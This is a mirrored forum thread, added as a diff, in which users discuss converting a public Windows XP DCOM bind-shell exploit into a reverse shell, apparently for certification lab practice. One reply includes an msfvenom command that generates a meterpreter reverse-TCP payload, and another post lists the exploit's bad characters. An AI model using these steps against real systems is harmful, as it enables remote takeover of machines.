@@ -1,0 +1,194 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml" dir="ltr" lang="en" id="vbulletin_html">
+
+<!-- Mirrored from garage4hackers.com/printthread.php?t=6882&pp=10&page=1 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 16:13:37 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=ISO-8859-1" /><!-- /Added by HTTrack -->
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
+	<base  /><!--[if IE]></base><![endif]-->
+	<meta name="generator" content="vBulletin 4.2.1" />
+
+	
+	<link rel="stylesheet" type="text/css" href="cssddc9.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=bbcode.css,popupmenu.css,printthread.css,vbulletin.css,vbulletin-chrome.css" />
+	
+
+
+
+	<title> XP DCOM custom windows reverse shell exploit issue</title>
+	<link rel="stylesheet" type="text/css" href="css657d.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=additional.css" />
+
+</head>
+<body>
+
+<div class="above_body">
+<div id="header" class="floatcontainer">
+<div><a name="top" href="forum.html" class="logo-image"><img src="images/misc/vbulletin4_logo.html" alt="Garage4hackers Forum" /></a></div>
+</div>
+</div>
+<div class="body_wrapper">
+<div id="pagetitle">
+	<h1><a href="showthreade5f6.html?t=6882">XP DCOM custom windows reverse shell exploit issue</a></h1>
+	<p class="description">Printable View</p>
+</div>
+
+
+
+<ul id="postlist">
+	<li class="postbit blockbody" id="post_1">
+	<div class="header">
+		<div class="datetime">07-04-2016, 08:21 AM</div>
+		<span class="username">mayank7651</span>
+	</div>
+	
+	
+		<div class="title">XP DCOM custom windows reverse shell exploit issue</div>
+	
+	<div class="content">
+		<blockquote class="restore">Hi Everyone,<br />
+<br />
+I am trying to modify the exploit located here on <a href="../external.html?link=https://www.exploit-db.com/exploits/66/" target="_blank">https://www.exploit-db.com/exploits/66/</a><br />
+the thing that i am trying is to replace the existing bind shell on port 4444 with my reverse shell hex chars but i am facing issue with finding out the bad chars for this exploit<br />
+and the return address, Can you please help me to convert this exploit into a reverse shell exploit? and also how can i go about this return address for this type of public exploits.<br />
+<br />
+thanks in advance</blockquote>
+	</div>
+</li><li class="postbit blockbody" id="post_2">
+	<div class="header">
+		<div class="datetime">07-04-2016, 08:34 AM</div>
+		<span class="username">b0nd</span>
+	</div>
+	
+	
+	<div class="content">
+		<blockquote class="restore">Do hit-n-trial for bad chars.<br />
+For return address, which OS are you using?<br />
+<br />
+Cheers!</blockquote>
+	</div>
+</li><li class="postbit blockbody" id="post_3">
+	<div class="header">
+		<div class="datetime">07-04-2016, 08:50 AM</div>
+		<span class="username">mayank7651</span>
+	</div>
+	
+	
+	<div class="content">
+		<blockquote class="restore">i can do hit and trail but there are many hex chars, and it is very time consuming and here the issue is i cannot even use immunity to see the registers dump so as to identify the bad char, are there any other ways to go about this? <br />
+  <br />
+I am using kali for exploiting XP machine <br />
+<br />
+any suggestions for return address?</blockquote>
+	</div>
+</li><li class="postbit blockbody" id="post_4">
+	<div class="header">
+		<div class="datetime">07-04-2016, 04:03 PM</div>
+		<span class="username">[s]</span>
+	</div>
+	
+	
+		<div class="title">how to use the MSFVENOM for reverse shell.</div>
+	
+	<div class="content">
+		<blockquote class="restore">Very first wget the the exploit code into your machine and try to run the exploit if it opening the bind port successfully opened, then check go for updating the exploit with reverse shell code. <br />
+<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<hr /><code class="bbcode_code">netstat -an | find &quot;4444&quot;</code><hr />
+</div>If you would like to generate the quick reverse shell, I would like to suggest you to use msfvenom<br />
+<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<hr /><code class="bbcode_code">msfvenom&nbsp; --platform windows -p windows/x64/meterpreter_reverse_tcp&nbsp; LHOST=192.168.0.1 LPORT=443 -b &quot;\x00&quot; -t raw</code><hr />
+</div>And also I would like to suggest you to look into the the size of the shellcode, which you generated or developed. Depend on the exiting default exploit shellcode size - add and remove NOP. <br />
+<br />
+I hope this will help you.</blockquote>
+	</div>
+</li><li class="postbit blockbody" id="post_5">
+	<div class="header">
+		<div class="datetime">07-06-2016, 05:26 AM</div>
+		<span class="username">mayank7651</span>
+	</div>
+	
+	
+	<div class="content">
+		<blockquote class="restore">Hi [S],<br />
+<br />
+I actually tried this before asking the query here, however failed to exploit.<br />
+One of the reason for failing was the bad character, as there are more bad characters than just &quot;/x00&quot;, i have got the list of bad characters now while checking out the same exploit in the metasploit directories there they have mentioned all the bad characters, Below are the bad chars:<br />
+<br />
+\x00\x0a\x0d\x5c\x5f\x2f\x2e<br />
+<br />
+i haven't reworked this, but will do once i get free from the lab. <br />
+<br />
+<br />
+If anybody in forum gets a chance to  try this then please share your experience.</blockquote>
+	</div>
+</li><li class="postbit blockbody" id="post_6">
+	<div class="header">
+		<div class="datetime">07-06-2016, 08:27 AM</div>
+		<span class="username">b0nd</span>
+	</div>
+	
+	
+	<div class="content">
+		<blockquote class="restore"><div class="bbcode_container">
+	<div class="bbcode_description">Quote:</div>
+	<div class="bbcode_quote printable">
+		<hr />
+		
+			<div>
+				Originally Posted by <strong>mayank7651</strong>
+				<a href="showthread8307.html?p=14676#post14676" rel="nofollow"><img class="inlineimg" src="images/buttons/viewpost.html" alt="View Post" /></a>
+			</div>
+			<div class="message">Hi [S],<br />
+<br />
+I actually tried this before asking the query here, however failed to exploit.<br />
+One of the reason for failing was the bad character, as there are more bad characters than just &quot;/x00&quot;, i have got the list of bad characters now while checking out the same exploit in the metasploit directories there they have mentioned all the bad characters, Below are the bad chars:<br />
+<br />
+\x00\x0a\x0d\x5c\x5f\x2f\x2e<br />
+<br />
+i haven't reworked this, but will do once i get free from the lab. <br />
+<br />
+<br />
+If anybody in forum gets a chance to  try this then please share your experience.</div>
+			
+		<hr />
+	</div>
+</div>Thanks for the feedback! <br />
+Best wishes for you labs &amp; exam.</blockquote>
+	</div>
+</li>
+</ul>
+
+
+</div>
+<div class="below_body">
+<div id="footer_time" class="footer_time">All times are GMT +5.5. The time now is <span class="time">04:58 PM</span>.</div>
+
+<div id="footer_copyright" class="footer_copyright">
+	<!-- Do not remove this copyright notice -->
+	Powered by <a href="../external.html?link=https://www.vbulletin.com/" id="vbulletinlink">vBulletin&reg;</a> Version 4.2.1 <br />Copyright &copy; 2020 vBulletin Solutions, Inc. All rights reserved. 
+	<!-- Do not remove this copyright notice -->	
+</div>
+<div id="footer_morecopyright" class="footer_morecopyright">
+	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
+	
+	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
+	Copyright 2010 - 2017, Garage4Hackers
+</div>
+ 
+</div>
+
+<script type="text/javascript">
+var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
+</script>
+<script type="text/javascript">
+try{
+var pageTracker = _gat._getTracker('UA-17311051-3');
+pageTracker._trackPageview();
+} catch(err) {}</script>
+</body>
+
+<!-- Mirrored from garage4hackers.com/printthread.php?t=6882&pp=10&page=1 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 16:13:37 GMT -->
+</html>
